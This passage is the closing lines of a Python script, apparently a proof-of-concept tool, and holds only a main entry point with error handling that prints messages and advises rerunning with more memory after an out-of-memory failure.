        flush=True,
    )


if __name__ == "__main__":
    try:
        main()
    except RuntimeError as exc:
        print(f"ERROR: {exc}", flush=True)
        raise SystemExit(1)
    except OSError as exc:
        if exc.errno == errno.ENOMEM:
            print(
                "ERROR: Ran out of memory; reattempt the PoC after a reboot "
                "or with more RAM (recommended 2GB+).",
                flush=True,
            )
            raise SystemExit(1)
        raise
